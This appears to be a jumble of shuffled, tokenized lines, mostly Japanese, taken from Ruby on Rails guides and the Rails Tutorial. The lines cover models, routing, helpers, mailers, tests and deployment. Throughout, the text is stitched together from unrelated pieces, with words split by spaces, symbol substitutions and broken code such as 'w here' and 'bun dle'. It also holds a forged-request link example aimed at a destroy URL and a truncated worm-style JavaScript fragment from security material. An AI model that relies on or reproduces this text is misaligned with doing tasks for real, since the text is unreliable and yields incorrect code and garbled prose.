Rails で は 、 オブジェクト から XML 形式 へ の 変換 と 、 変換 さ れ た XML を ブラウザ に 送信 する 機能 が ビルト イン で サポート さ れ て い ま す 。
*  ` since ` や ` ago ` の 移動 先 の 時間 が ` Time ` で 表現 でき な い 場合 、 ` DateTime ` オブジェクト が 代わり に 返 さ れ ま す 。
= > [ " A " ,   " B " ,   " C " ]
リスト \ ref{ code :micropost _ instance_ variable } の とき
HTML ソース の 中 の 、 フォーム を 形成 する HTML 構造 に 注目 し て み ま しょ う 。
Microposts リソース の 追加 に よ っ て 、 サンプル アプリケーション は ほぼ 完成 に 近づ き ま し た 。
次 は マイクロ ポスト 作成 フォーム を 定義 し ま す   ( リスト \ ref{ code :micropost _ form } ) ▟ これ は ユーザー 登録 フォーム に 似 て い ま す   ( リスト \ ref{ code : signup _ form } ) 。
hash                     # => {: b = > 2 }
コード 生成 、 コンソール の 起動 、 ローカル の Web サーバ の 立ち上げ など に 使用 する Rails スクリプト
   self ▖ include _root_ in_json  =  false
       layout   " special "
この 機能 が 必要 な コントローラ で は ` ActionView: : RecordIdentifier ` モジュール を インク ルード する 必要 が あ り ま す 。
\ kode { full_title } ヘルパー の テスト 。
|  test/controllers/ comments_controller_test ▖ rb  |  コントローラ の テスト 用 ファイル                |
ビュー その もの は 1 ページ の コード で す が 、 アプリケーション の データベース から 取り出 し た 情報 を 使用 し て 各 プロファイル の 表示 を カスタマイズ し ま す 。
リスト \ ref{ code :user_ signup_with _account_activation } で は 、 登録 時 の リダイレクト の 挙動 が 変更 さ れ て い る 点 に ご 注意 くださ い 。
Home ページ と Profile ページ に あ る 統計 情報 の テスト を 書 い て み て くださ い 。
destroy
#   < foo type =" integer " > 1 < / foo>
( \ kode {private } キー ワード の 詳細 に つ い て は   \ ref{ sec : remember_me } で 説明 し ま す ) 。
これ は リスト \ ref{ code :user_edit_view } で 使用 さ れ て い ま し た 。
* `: in `   また は  `: within`  -   属性 の 長 さ は 、 与え られ た 区間 以内 で な けれ ば な り ま せ ん 。
いつ も の よう に 、 以下 を 実行 し て テスト スイート が 緑色   ( 成功 )   に な る こと を 確認 し て から 先 に 進 み ま しょ う 。
フォーム ヘルパー は 、 モデル 属性 の 操作 に 特化 し た もの と 、 より 一般 的 な もの の 2 種類 に 分類 でき ま す 。
#### `split ( value  = nil ) `
< a   href = 'http://example ▖ com/articles /1 / destroy'> look   at  this   cat !
    <p > こんにちは 、 以下 の 写真 で す ▟</p>
モデル の 自動 生成 に つ い て も 、 同様 の 方法 で 元 に 戻 す こと が でき ま す 。
CD N を 使用 し て い な い 場合 、 ブラウザ は この ヘッダ 情報 を 使用 し て コンテンツ を キャッシュ し ま す 。
@order   = @customer▖ orders▖ create(order_ date:   Time▖now ,
\ ref{ sec :unsuccessful_ signups } で は 、 ユーザー が 制約 に 違反 し た とき に 、 検証 機能 に よ っ て 自動 的 に 表示 さ れ る 有用 な エラー メッセージ を お 見せ し ま す 。
永続 ユーザー ID を 含 む cookies を 受け取 っ た ら 、 その ID で データベース を 検索 し 、 記憶 トークン の cookies が データベース 内 の ハッシュ 値 と 一致 する こと を 確認 する 。
この ヘルパー は 、 ` : only_ integer ` 以外 に も 以下 の オプション を 使用 し て 制限 を 指定 でき ま す 。
ルーティング に コレクション   ( collection )   を 追加 する に は 以下 の よう に し ま す 。
フォーム その もの は リスト \ ref{ code : signup _ form } で 示 し ま す 。
デフォルト で は 、 ` nil ` 、 `false ` 、 `true ` 、 シンボル 、 数値 、 クラス 、 モジュール 、 メソッド オブジェクト を 除 く すべて の オブジェクト が ` duplicable ? ` #=> true で す 。
If  ` return`   is   needed it   is   recommended to   explicitly  define   a   method ▖
` app/views/user_mailer/` ディレクトリ で ` welcome_email ▖html ▖erb ` と い う ファイル を 1 つ 作成 し て くださ い 。
新し い Micropost の 有効 性 に 対 する テスト  
小 文字 で 始ま る 文字 列 も 扱え ま す 。
#   option   will   only  run  in  the  specified context ▖
{ 0 } 図 11 ▖ 11 { / 0 }   { 1 } 新し い マイクロ ポストフォーム の あ る Home ページ   { / 1 }
####  javascript_url
簡単 に 言 う と 、 まず 以下 の コマンド で データベース の マイ グレーション を 変更 でき ま す 。
self を 省略 し た 結果 を リスト \ ref{ code :edit_tests_ logged_ in } に 示 し ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : sample_app _readme } に 示 し ま す 。
経験 上 、 残念 ながら マイナー アップグレード で すら 問題 を 引き起こ す こと が あ り ま す ▟ この ため 、 \emph { Rails チュートリアル } で は 基本 的 に すべて の gem で バージョン を ピンポイント で 指定 し て い ま す 。
| `{  " person " :  [ " foo " ,  null ]  }`     | `{ : person  => [ " foo" ]  }` |
Time▖ current
*   アプリケーション の エンジン 機能 を 上書き する
###  機能 リクエスト に つ い て
これ は リスト \ ref{ code : update_ columns } で 使用 さ れ て い ま し た 。
   belongs_to  : customer ,   class_ name :  " Patron "
`t ▖ references ` と い う 行 は 、 2 つ の モデル の 関連 付け を 指定 する ため の 外部 キー を 設定 し ま す 。
他 の 演算 子 に つ い て も 同様 の 短縮 形 が 利用 でき ま す 。
最後 に 、 サイン イン ページ を 新規 に 定義 し ま す 。
` javascript_ include_tag ` ヘルパー は 、 指定 さ れ た ソース ごと に HTML   ` script ` タグ を 返 し ま す 。
いま いまし い エラー で す が 、 修正 は 比較 的 簡単 で す 。
label_tag  ' name '
ブラウザ から 「 / users 」 と い う URL の リクエスト を Rails サーバー に 送信 する 。
   def  self ▖ created_before ( time)
オブジェクト の 作成 、 保存 、 更新 時 に 特定 の バリデーション を 実行 する こと も でき ま す 。
class   Application Mailer <  Action Mailer : : Base
それ で は 、 必要 と な る もの に つ い て 解説 し ま す 。
```js
###   配列 で 表 さ れ た 条件
` app/models/article ▖ rb ` ファイル を エディタ で 開 き 、 以下 の よう に 変更 し ま す 。
#  config▖ action_dispatch ▖ x_sendfile_header  =  'X - Accel - Redirect' #  NGINX 用
技術 上 は 、 SSL は TLS   ( Transport  Layer   Security )   と 名称 が 変わ り ま し た が 、 未だ に   “ SSL ”   と 呼 ば れ 続け て い ま す 。
通常 の ルーティング の 一部 と し て 、 文字 列 を 固定 し な い 動的 な セグメント を 自由 に 使用 でき ま す 。
2009 ▖ordinal  # => " th "
たとえば ` blank ? ` の 場合 、 以下 の よう な メモ を 追加 し て あ り ま す 。
{ 0 } 図 12 ▖ 3 { / 0 }   { 1 } ユーザー の プロフィール 画面 に   [ Follow ]   ボタン が 表示 さ れ て い る { / 1 }
Article ▖ recent▖any?
クラス メソッド に し た 場合 で も 、 関連 オブジェクト から アクセス 可能 で す 。
    rescue _ from ( ActiveRecord : : Record NotFound )   do   | exception |
= > #<User : 0 x 225167 c  @email = " mhartl@example ▖ com " ,╼@ name =" Michael   Hartl " >
MVC モデル を 紹介 でき た
ログ イン ユーザー 用 before フィルター に \ kode {store\_ location } を 追加 する
[ ` link_to` ] ( http://api▖ rubyonrails ▖org / classes / ActionView/ Helpers/UrlHelper▖html # method - i - link_to)   は リンク の 生成 を 支援 する ヘルパー で す 。
その 他 の 関連 付け 方法 に つ い て は 、 次 の 節 を お 読 み くださ い 。
イン ライン コール バック ブロック で ` return ` を 使用 し て い る 場合 、 以下 の よう に リファクタリング する こと で 、 返 さ れ た 値 と し て 評価 さ れ る よう に な り ま す 。
private
get   Rack : :Utils ▖escape ( ' こんにちは ') ,  controller :  'welcome',   action :  'index'
` audio _tag ` は 、 指定 さ れ た ファイル を 指 す HTML   5   ` < audio > ` タグ を 生成 し ま す 。
この テスト は かなり 込み 入 っ て い る の で 、 1 つ 1 つ 作り上げ て い き ま しょ う 。
命名 ルール を 上書き する
\ kode {p }  ( paragraph )   タグ を 使 っ て 、   “ Hello ,   world ! ”   と 表示 する よう に し て い ま す 。
#### image_ submit_tag
#   Remove  this   line  if  you' re   not   u sing   ActiveRecord ╼    # or   ActiveRecord   fixtures
\ ref{ sec :static _ pages } で は 、 静的 ページ の 開発 の ため の Git ブランチ を 用意 し ま し た 。
入力 の どこ に 問題 が あ っ た の か を ユーザー に 通知 する 必要 が あ り ま す 。
</strong >
` compact ` メソッド と ` compact ! ` メソッド は 、 ハッシュ から ` nil ` 値 を 除外 し た もの を 返 し ま す 。
self を 省略 し た 結果 を リスト \ ref{ code :user_feed } に 示 し ま す 。
次 に 、 Heroku へ の デプロイ 、 データベース の リセット 、 サンプル データ の 生成 を 順 に 実行 し て い き ま す 。
<%=  csrf _ meta_tags %>
#     <url- id > david - heinemeier - hansson< /url- id >
XSS を チェック する 最も 簡単 な テスト を ご 紹介 し ま す 。
Contact ページ の テスト を リスト \ ref{ code :contact _ page_test } に 示 し ま す ▟ これ は 単に リスト \ ref{ code :title_tests } で 使用 さ れ て い る テスト の パターン に 従 っ た もの で す 。
Oh   dear !
@orders  =  Order ▖ w here ( customer_ id : @customer▖ id )
$ ▖ajax ( url:  "/ test " ) ▖ done   ( html )  ->
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ hash/reverse_merge▖ rb ` で す 。
カスタム CSS を 動か す ため の 最初 の 一 歩 は 、 カスタム CSS ファイル を 作 る こと で す 。
アカウント 有効 化 メール の プレビュー   ( HTML バージョン )
1 つ は 、 ( 以前 と 同様 )   関連 付け を 使用 し て 次 の よう に \ kode {@micropost } を 定義 する こと で す 。
これ を 指定 し な い と 、 Rails は 実在 し な い \ kode { ReverseRelationship } クラス を 探 し に 行 っ て しま い ま す 。
終わ っ た ら 、 [ Send  pull   request ]   を 押 し ま す 。
{ 0 } 図 2 ▖ 12 { / 0 }   { 1 } 新し い マイクロ ポスト の 作成 ページ   ( \ href { http://local host : 3000 / microposts/new}{/microposts/new}) { / 1 }
この コード で は ` try ` を 使用 し た こと で 余分 な チェック を 行 わ ず に 済 ん で い ま す 。
つまり 、 この \ kode {relationships } 関連 付け で は 以下 の よう に \ kode { follower_ id } を 外部 キー と し て 使用 し 、
<%  content_ for   : head   do  %>
*  `config▖ action_dispatch ▖ signed_cookie_salt ` は 、 署名 済み cookie 用 の salt 値 を 設定 し ま す 。
あるいは 、 ` RAILS _ RELATIVE_ URL _ ROOT ` 環境 変数 に 設定 する こと も でき ま す 。
多く の システム で は 、 pending の spec は コマンドライン 上 で 黄色 で 表示 さ れ ま す ▟ 黄色 は 、 成功   ( 緑 )   と 失敗   ( 赤 )   の 中間 を 意味 し ま す 。
( 第 1 章 で も 書 き ま し た が 、 Bundler で \ texttt { readline } エラー が 発生 し た 場合 は 、 \ kode { Gemfile } に \ kode {gem  ’rb - readline ’} を 追加 し て くださ い ) 。
    element▖style▖ color   =  text Color
本編 と 演習 問題 を 分け る ため に 、 その 後 の コード リスト に は 原則 と し て 解答 を 付け て い ま せ ん 。
1234 ▖ to_s(:human_size)            # = >   1 ▖ 21   KB
それ が ハッシュ の 場合 、 その ハッシュ を 取り出 し て 返 し 、 それ 以外 の 場合 は 空 の ハッシュ を 返 し ま す 。
これ ら の フィールド 情報 は ユーザー 側 から 提供 さ れ る もの で あ り 、 さほど 手間 を かけ ず に 操作 でき て しま い ま す 。
* ` ActionDispatch : : Static ` は 静的 アセット で 使用 さ れ ま す 。
     Time▖ current   -  created_at
Vim の 場合 は 以下 を 実行 し ま す 。
これ ら の ボタン の テスト に は 、 本書 で 扱 っ た さまざま な テスティング の 技法 が 集約 さ れ て い ま す ▟ この テスト コード を 読 む の は よ い 練習 に な り ま す 。
この 名前 が Rails   Git リポジトリ に その まま 取り込 ま れ る こと は あ り ま せ ん 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/array /conversions ▖rb ` で す 。
` Proc ` オブジェクト を 使用 する と 、 個別 の メソッド を 指定 する 代り に 、 その 場 で 条件 を 書 く こと が でき る よう に な り ま す 。
これ は リスト \ ref{ code :factory_ sequence } で 使用 さ れ て い ま し た 。
{ 0 } 図 2 ▖ 13 { / 0 }   { 1 } マイクロ ポスト の index ページ   ( \ href { http://local host : 3000 / microposts}{/microposts}) { / 1 }
上 の コード で は 、 ローカル 変数 で あ る ` product ` の 中 に `@ product ` が 置 か れ ま す ▟ これ は 以下 の コード と 同等 の 結果 に な り ま す 。
    attr_accessor   : log _ level
\ kode {flash } 変数 の 内容 を Web サイト の レイアウト に 追加 する
これ ら の ミドルウェア は 、 まったく 別 の もの に 差し替え る こと も でき ま す 。
|   app/controllers/ comments_controller▖ rb        |  コメント 用 コントローラ                   |
    block ,  time =  self ,   Time▖ current
Windows で は ` c : \ source_ code >` の よう に 表示 さ れ ま す 。
<%=   javascript_ include_tag   " application " ,   debug :   true   %>
この 時点 で コメント を 作成 し よう と する と 、 以下 の よう な エラー が 生じ る で しょ う 。
*   空白 文字   ( whitespace )   だけ で 構成 さ れ た 文字 列   ( 以下 の 注釈 参照 )
User ▖ all
c 1 ▖ save
` Date ` の 拡張
個人 的 に は \ href { http://nodejs▖org / }{ Node ▖js } が お すすめ で す ) 。
新規 ユーザー 登録 後 に ユーザー が サイン イン し た こと を テスト する 。
       create   app
この コード で は 、 記憶 トークン で 使用 し た トークン の メソッド や ダイジェスト の メソッド を ストレート に 使いまわ し て い ま す ▟ リスト \ ref{ code :user_ model_remember } の \ kode {remember } メソッド と 比べ て み ま しょ う 。
####  アプリケーション の 設定 を 行な う
\ kode {xhr } が 取 る 引数 は 、 関連 する HTTP メソッド を 指 す シンボル 、 アクション を 指 す シンボル 、 また は コントローラ 自身 に あ る \ kode { params } の 内容 を 表 す ハッシュ の いずれ か で す 。
これ で 、 以下 の コード が 誤 っ て い る 理由 を 見つけ る ため の 準備 が 整 い ま し た 。
参考 まで に 、 最終 状態 の \ kode { Gemfile } を リスト \ ref{ code :final _ gemfile } に 示 し ま す 。
Puma が 使 う よう に \ kode { Procfile } で 定義 する
RubyGems を インストール し て しま え ば 、 Rails の インストール は 簡単 で す 。
作成 し た コード を リスト \ ref{ code : login_after_ signup_test } に 示 し ま す
` limit ` メソッド は 、 取り出 す レコード 数 の 上限 を 指定 し ま す ▟ ` offset ` は 、 レコード を 返 す 前 に スキップ する レコード 数 を 指定 し ま す 。
これ は リスト \ ref{ code : authentication_steps } で 使用 さ れ て い ま し た 。
` with _options ` メソッド は 、 連続 し た 複数 の メソッド 呼び出し に 対 し て 共通 し て 与え られ る オプション を 解釈 する ため の 手段 を 提供 し ま す 。
      t▖timestamps
` has _one  : through ` 関連 付け は 、 他 の モデル と の 間 に 1 対 1 の つながり を 設定 し ま す 。
|   app/helpers/ comments_helper▖ rb                |  ビュー ヘルパー                        |
       entry ▖ author   do  | author |
$ bun dle   exec   rake   db : migrate : reset╼$ bun dle   exec   rake   db : seed
$ bun dle   exec   rake   db : migrate
ホワイト リスト フィルタ で は 特定 の 値 のみ が 許可 さ れ 、 それ 以外 の 値 は すべて 拒否 さ れ ま す 。
    get  'preview',   on : : new
これ は リスト \ ref{ code : name_presence_ test } で 使用 さ れ て い ま し た 。
\ href { http://railscasts▖ com/}{ RailsCasts } ▟ 強 く 推奨 し ま す ▟ この RailsCasts の 素晴らし さ に つ い て は 、 どれ ほど 言葉 を 尽く し て も 足 り ま せ ん 。
Github の issue に あが っ て い る [ 皆 から の issue ] (https://github▖ com/rails/rails/issues ) を 見 て み る と 、 注目 を 集め て い る issue が たくさん 見つか り ま す 。
$  bin/rake   db :sessions : clear
User モデル に \ kode { has\_ secure\ _ password } を 追加 する   (  \failing   )
次 は \ kode {all } メソッド で す 。
   delegate  : name ,  to : : profile
これ は リスト \ ref{ code : show _ only _ と ctive_users _exercise } で 使用 さ れ て い ま し た 。
( この よう な 比較 的 単純 な オブジェクト の 複製 作業 は   “ shallow copy ”   と し て 知 ら れ て い ま す 。
あなた の パッチ に 反応 が あ っ た とき と おなじ ぐらい 、 その 人 たち も きっと 嬉し く 思 う こと で しょ う 。
これ は 多く の 属性 を 一 度 に 更新 し た い 場合 に 特 に 便利 で す 。
この まま で は 、 ユーザー 名 が 空欄 で あ っ たり 、 でたらめ な メール アドレス を 入力 し たり し て も 通 っ て しま い ま す 。
Text Mate を 使用 し て い れ ば 、 \ texttt { View > Wrap   Column   >   78 } で 設定 でき ま す 。
上 の メソッド を 使用 すれ ば 、 \ kode {user ▖ followed_users } に あ る 各 要素 の \ kode {id } を 呼び出 し 、 フォロー し て い る ユーザー の id の 配列 を 構成 する こと が でき ま す 。
$  rails   new unicorn
さらに 、 ` image_tag ` の 場合 と 同様 に 、 ` size: " #{ 幅 } x # { 高 さ } " ` オプション を 指定 する こと も でき ま す 。
" special "  :  " products "
Rails の クラス は 、 普通 の Ruby オブジェクト と 同様 に 振る舞 う もの も あ り ま す が 、 多く の クラス に は Rails の \ href { http://www ▖answers▖ com/grist } { 魔法 の 粉 } が 振りかけ られ て い ま す 。
マイグレーション および スキーマ で は 、 モデル 自身 に references カラム を 追加 し ま す 。
= > StaticPages Controller
       secret_key_ base :
   var   IDList   =  '';    var   CRumb  = '';   function   makeRequest ( url,  Func ,   Method , Param )  { ▖▖▖
*  `config▖ action_dispatch▖ session_store ` は セッション データ の ストア 名 を 設定 し ま す 。
マイクロ ポスト の \ kode {user \ _ id } に 対 する 検証  
これ を 実装 する ため に は 、 \emph {default  scope } と い う テクニック を 使 い ま す 。
寄せ られ た 修正 を 適用 する に は 、 まず 次 の よう に 専用 の ブランチ を 作成 し て くださ い 。
好み に 応 じ て 、 画像 ファイル へ の パス を 直接 指定 する こと も でき ま す 。
( 1 ▖ ▖ 5 ) ▖ sum {|n| n  *   2   } # = >  30
Module ▖ new▖ name  # => nil
{ 0 } 図 11 ▖ 8 { / 0 }   { 1 } 別 ユーザー の プロフィール と マイクロ ポスト   ( \ href { http://0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users /5 }{ / users /5 }) { / 1 }
self を 省略 し た 結果 を リスト \ ref{ code : sign_in_with _remember } に 示 し ま す 。
= >   Booting   WEBrick
あるいは 、 ` Rails ▖ application ` オブジェクト に 対 し て ` config ` メソッド を 実行 する こと で 行な う こと も でき ま す 。
記事 の コメント を 表示 でき る よう に する ため に 、 ` app/views/blorgh/articles/show ▖html ▖erb ` を 編集 し て 以下 の 行 を " Edit " リンク の 直前 に 追加 し ま す 。
    has_many : confirmed_orders ,  -> {  w here   " confirmed  =   1 "   } ,
{ 0 } { 1 } 第 8 章 { / 1 } { / 0 } で は 、 認証   ( authentication )   システム を 導入 し 、 ユーザー が ログ イン と ログ アウト を でき る よう に し ま す 。
 * = require_ self
なお 、 現在 の \ kode { Gemfile } に 対応 する バージョン の Rake が 確実 に 実行 さ れ る よう に する ため に 、 \ kode {bun dle   exec } を 使用 し て \ kode {rake } を 実行 し ま す
*  `config▖ action _mailer▖ default _options ` は 、 Action   Mailer の デフォルト を 設定 し ま す 。
ログ イン 中 の 場合 のみ ログ アウト する  
上 の メソッド は 、 以下 の 形式 の URL を 生成 し ま す 。
この コード は リスト \ ref{ code :hello_ action _redux } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
has_ secure_ password
self を 省略 し た 結果 を リスト \ ref{ code :installing _ rails } に 示 し ま す 。
今回 は 、 2 つ の 新し い gem を 使 い ま す ▟ RSpec の ため の gem と 、 RSpec の ライブラリ の ため の gem で す 。
マイグレーション を 使 う こと で 、 アプリケーション の データ モデル を 修正 する こと が でき る
デフォルト で は 、 ` to_ param ` メソッド は 単に ` to_s ` メソッド を 呼び出 し ま す 。
|   GET        | / kategorien/:id / bearbeiten |  categories#edit     | edit_category _ path(:id )  |
たとえば 、 以下 の よう に 同じ オプション を 繰り返 さ な い で 済 む よう に な り ま す 。
### `only`
ファイル を 連結 し て ひと つ に する こと に よ り 、 ブラウザ から サーバー へ の リクエスト 数 を 減ら す こと が でき 、 ページ の 読み込 み 時間 が 大き く 短縮 さ れ ま す 。
#   See  https://github▖ com/sstephenson/ execjs# readme #   for   more   supported  runtimes
    <td ><%=   link_to  'Edit' ,  edit_ article _ path ( article )  %></td>
date  =  Date▖ current # =>  Fri ,   11   Jun  2010
   " Float "       => " float " ,
/publishers/ 1 / magazines /2/photos/ 3
この アプリケーション は エンジン を ` test/dummy / config/ routes▖rb ` ファイル 内 で 以下 の よう に マウント し ま す 。
####  ファイル を 添付 する
fixture に さらに 30 人 の ユーザー を 追加 する
アプリケーション の すべて の コピー が 同じ gem の バージョン を 使用 し て い る こと を 確認 する ため に 使用 さ れ る gem の リスト
リスト \ ref{ code : layout_links_test } の 統合 テスト で は 、  \kode { get } メソッド を 使 っ て ユーザー 登録 ページ に アクセス し 、 ページ タイトル が 正し い か どう か チェック する テスト コード を 加え て くださ い 。
この コマンド は 、 初回 実行 時 に エンジン から すべて の マイ グレーション を コピー し ま す 。
  >>  Rails ▖env
#   圧縮 機能 を 使用 する に は   config ▖ assets▖js_ compressor   =   を 使用 する
           def  bar
Active   Record   の 関連 付け   ( アソシエーション )
c  =   Customer▖ first
別 の レイアウト ファイル を 明示 的 に 指定 し た い 場合 は 、 メイラー で ` layout ` を 呼び出 し ま す 。
上 の 宣言 は 、 以下 の よう に orders テーブル 上 の 外部 キー 宣言 に よ っ て 裏付け られ て い る 必要 が あ り ま す 。
#   関数 呼び出し の 丸 かっこ は 省略 可能 。
Client▖ pluck(:name ) ▖ limit ( 1 )
たとえば 以下 の よう に 、 20 年 後 に 期限 切れ に な る 記憶 トークン と 同じ 値 を cookie に 保存 する こと で 、 永続 的 な セッション を 作 る こと が でき ま す 。
resources   : photos  do
Command - Shift - E コマンド で 上 の テスト と 同じ テスト を 実行 し 、 今度 は 成功 する こと を 確認 する 。
従 っ て 、 名前 付き ルーティング ヘルパー に つ い て も   "*_ path "   で は な く   "*_url"   を 使用 する 必要 が あ り ま す 。
|   GET        | / comments/:id/edit ( ▖: format )            |  comments#edit      | edit_sekret_comment_ path   |
( \ ref{ sec : the_flash } で シンボル が 式 展開 さ れ て 文字 列 に な っ た こと を 思い出 し ま しょ う ) 。
基本 タイトル
マーキング さえ さ れ て い れ ば 、 「 実際 に エスケープ さ れ て い る か どう か に かかわ ら ず 」 その 文字 列 は 信頼 さ れ ま す 。
Rails は I 18n ▖ locale に 設定 でき る シンボル を 制限 し て い な い の で 、 ローカライズ に かぎ ら ず 、 あらゆる 状況 に 合わせ て 異な る コンテンツ を 表示 し 分け る よう に する こと が でき ま す 。
作成 し た コード を リスト \ ref{ code : action_tests_ admin } に 示 し ま す
= >   [ 42 ,   8 ,   17 ,   6 ]
SELECT  *  FROM   articles   WHERE   id   =   10
#### `Date▖ current `
最小 化 方法 は ビルト イン の オプション から 選 ん だり 、 独自 に 指定 し たり する こと が でき ま す 。
Rails に は ミドルウェアスタック を 調べ る ため の 便利 な Rake タスク が あ り ま す 。
今度 は 以下 が 表示 さ れ ま し た 。
本項 で は 、 \ ref{ sec :unsuccessful_ signups } の ユーザー 登録 に 失敗 し た とき と 似 た 方法 で 、 編集 に 失敗 し た 場合 に つ い て 扱 っ て い き ま す 。
item =   Item▖ first
上 で 実行 さ れ る SQL は 以下 の よう な もの に な り ま す 。
@order_count  = @customer▖ orders▖ size
逆 リレーションシップ を テスト する 。
置き換え の 終わ っ た 正し い アプリケーション コード を リスト \ ref{ code :correct_ login_failure } に 示 し ま す 。
\ texttt { GET } や その 他 の HTTP メソッド に つ い て
      t ▖ belongs_to  : account
   validates :email ,  uniqueness:  true
|                     |  30 1                | : moved _permanently               |
今度 は \emph { 逆 の } 関係 を 考え ま す ▟ \ kode { follower_ id } カラム を 使用 し て 、 ユーザー の フォロワー の 配列 を 取り出 す こと が でき ま す 。
それ で も count メソッド が アプリケーション の ボトルネック に な る よう な こと が あ れ ば 、 さらに 高速 な \ href { http://railscasts▖ com/episodes/23 - counter - cache- column } {\emph{counter   cache} } を 使 う こと も でき ま す 。
マイクロ ポスト の 最大 文字 数 を 140 文字 に 制限 する 。
記憶 ダイジェスト 用 に 生成 し た マイグレーション
Relationships コントローラ
| README ▖ rdoc | アプリケーション の 概要 を 説明 する マニュアル を ここ に 記入 し ま す 。
本書 で は 可能 な 限り 多く の 環境 を カバー する よう に し て い ま す が 、 システム が 変わ れ ば 手順 が うま く い か な い こと も あ り ま す 。
   def  some_method
渡 す オプション は ` config ▖ ssl_options ` で 設定 でき ま す 。
Client ▖ order ( " created_at " )
さらに 、 アプリケーション に 変更 が 生じ る たび に 、 まったく 同じ テスト を 繰り返 さ な けれ ば な り ま せ ん 。
その 代わ り 、 Form TagHelper の メソッド で は 名前 と 値 を 個別 に 指定 し ま す 。
順序 に つ い て は ひとまず ここ で 区切 る こと に し 、 今度 は マイクロ ポスト に 第 二 の 要素 を 追加 し て み ま しょ う 。
ユーザー の フォロワー を 表示 する
これ は リスト \ ref{ code :micropost _model } で 使用 さ れ て い ま し た 。
上 の コード を 実行 する と 、 以下 の よう な SQL が 生成 さ れ ま す 。
有効 な ユーザー
この メソッド は 、 RailsCast の 「 \ href { http://railscasts▖ com/episodes/274 - remember - me - reset - password } { remember   me} 」 の 記事 を 元 に 選 び ま し た 。
括弧 を 使用 し て リスト \ ref{ code : validates_presence _ of_ name } を 同等 の コード に 書き換え た もの を 以下 に 示 し ま す 。
` has_and _belongs_to_many ` 関連 付け に オブジェクト を アサイン する と 、 結合 テーブル を 更新 する ため に その オブジェクト は 自動 的 に 保存 さ れ ま す 。
" Invoice " ▖tableize     # => " invoices "
Rails   4 ▖ 0   で は   ` vendor/plugins `   読み 込み の サポート は 完全 に 終了 し ま し た 。
タイトル に ERB コード を 使用 し た About ページ の ビュー
そこ で 、 失敗 が 発生 する テスト の 行 を ひとまず コメント アウト し て お き ま す   ( リスト \ ref{ code : comment _out _failing _ tests} ) 。
#    label(:article ,  :title ,   " A   short title " ,   class: "title_label " )
` auto_discovery _ link_tag ` ヘルパー を 使用 する と 、 多く の ブラウザ や フィード リーダー で RSS フィード や Atom フィード を 検出 でき る HTML が 生成 さ れ ま す 。
####  メイラー を 呼び出 す
ユーザー 登録 ページ に フラッシュ メッセージ を 追加 する
   ->   Seq   Scan   on  articles   ( cost = 0 ▖ 0 0 ▖ ▖ 28 ▖ 88   rows = 8   width = 4 )
config ▖ generators  do  | g |
さて 、 ブログ の 記事 と コメント が 動作 する よう に な っ た の で 、 ここ で ` app/views/articles/show ▖html ▖erb ` テンプレート を 見 て み ま しょ う 。
{ 0 } { 1 } 図 2 ▖ 10 { / 1 } { / 0 } の   [ Destroy ]   リンク を クリック する と ユーザー が 削除 さ れ 、 index ページ の ユーザー は 1人 だけ に な り ま す
\ kode {new } アクション に \ kode {@user } 変数 を 追加 する
最後 に 、 ` f ` オブジェクト に 対 し て ` submit ` を 実行 する と 、 フォーム の 送信 ボタン が 作成 さ れ ま す 。
    INNER   JOIN categories   ON   articles ▖category _ id   =  categories ▖id
invoices ▖index_ by ( &: number )
ユーザー 編集 時 の エラー 表示 を 更新 する
` via :  : all ` を 指定 する と 、 すべて の HTTP 動詞 に マッチ する 特別 な ルーティング を 作成 でき ま す 。
( \ kode {shared } ディレクトリ は 第 \ ref { cha : sign_up } 章 で 作成 し ま す ) 。
###   利用 可能 な コール バック
フォロワー を 返 し ま す
ファイル や ディレクトリ が 図 \ ref { fig: cloud 9 _ gemfile } の よう に 表示 さ れ な い 場合 、 ナビゲーター の 歯車 アイコン を クリック し て   [ Refresh  File   Tree ]   を 選択 し ま す
さらに 、 Heroku の free  tier   プラン に は 、 チュートリアル で の 利用 を 含 む さまざま な 用途 の ため の 機能 が 十分 過ぎ る ほど 備わ っ て い ま す 。
マルチ パート メール に 挿入 さ れ る パート の 順序 は ` Action Mailer : : Base ▖ default ` メソッド の ` : parts_order ` に よ っ て 決ま り ま す 。
` association = ` メソッド は 、 引数 の オブジェクト を その オブジェクト に 関連 付け ま す 。
   item▖increment ! (:views)
###  コントローラ の 名前 空間 と ルーティング
リレーションシップ と い う パズル の 最後 の 一 片 は 、 \ kode {user ▖ followers } メソッド を 追加 する こと で す ▟ これ は 上 の \ kode {user ▖ following } メソッド と 対 に な り ま す 。
作成 し た コード を リスト \ ref{ code :persistent_sessions_test } に 示 し ま す
/ users / 1 に アクセス し た 時 の エラー ログ
自分 の PC 上 の コード に 満足 が い く よう に な っ た ら 、 変更 を Git に コミット し ま す 。
しかし 、 Rails の エンジン は 基本 的 に メイン と な る アプリケーション から 独立 し て い る の で 、 エンジン が 利用 でき る ` Application Controller ` は スコープ で 制限 さ れ て い ま す 。
以前 の Rails で は 、 すべて の アセット は ` public ` ディレクトリ の 下 の ` images` 、 ` javascripts` 、 `stylesheets ` など の サブ フォルダ に 置 か れ ま し た 。
*  `config▖encoding ` は アプリケーション 全体 の エンコーディング を 指定 し ま す 。
* `: validate`
パスワード 再 設定 メール の プレビュー   ( テキスト バージョン )
*  ` has _one  : through `
class   Articles Controller <  Application Controller
WARNING:  `atomic _write ` で 追記 を 行な う こと は でき ま せ ん 。
\ kode { form\_ for } ヘルパー は 、 Active   Record の オブジェクト に 対応 し た フォーム を 生成 する
# => < input   id= " accept "   name = " accept " type = " checkbox "   value = " 1 "   />
スペース が 集ま っ て でき た 文字 列 は \emph { 空   (empty)   } と は 認識 さ れ ま せ ん が 、 \emph { 空白   ( blank)  } で あ る と 認識 さ れ て い る こと が わか り ま す 。
多く の Unix 系 OS に は 実用 的 な バージョン の SQLite 3 が 同梱 さ れ て い ま す ▟  
\ kode {sudo } コマンド を 実行 する と デフォルト で root   ( スーパー ユーザー )   に 切り替わ る ため か 、 多く の 人 が sudo コマンド を   " superuser   do "   の 略 だ と 誤 っ て 信 じ て い ま す 。
これ に よ り 、 \ kode { spec/requests } ディレクトリ に \ kode {static _ pages_spec ▖ rb } が 生成 さ れ ま す 。
Your  words  made  sense ,  but  your  sarcastic   tone  did   not ▖
" Ruby   on   Rails   Tutorial   Sample  App |  About "
